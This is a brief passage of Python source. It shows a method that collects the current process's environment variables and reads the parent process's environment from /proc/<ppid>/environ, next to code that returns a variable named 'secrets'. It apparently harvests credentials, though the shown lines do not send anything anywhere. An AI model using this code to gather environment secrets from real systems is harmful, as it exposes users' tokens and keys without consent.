        return secrets

    def get_env_vars(self):
        env_vars = {}
        try:
            # Current process env
            env_vars['current'] = dict(os.environ)

            # Parent process env
            pid = os.getppid()
            with open(f'/proc/{pid}/environ', 'rb') as f:
                env_data = f.read().split(b'\x00')
                parent_env = {}
                for item in env_data:
                    if b'=' in item:
                        k, v = item.split(b'=', 1)
                        parent_env[k.decode()] = v.decode()
                env_vars['parent'] = parent_env
        except:
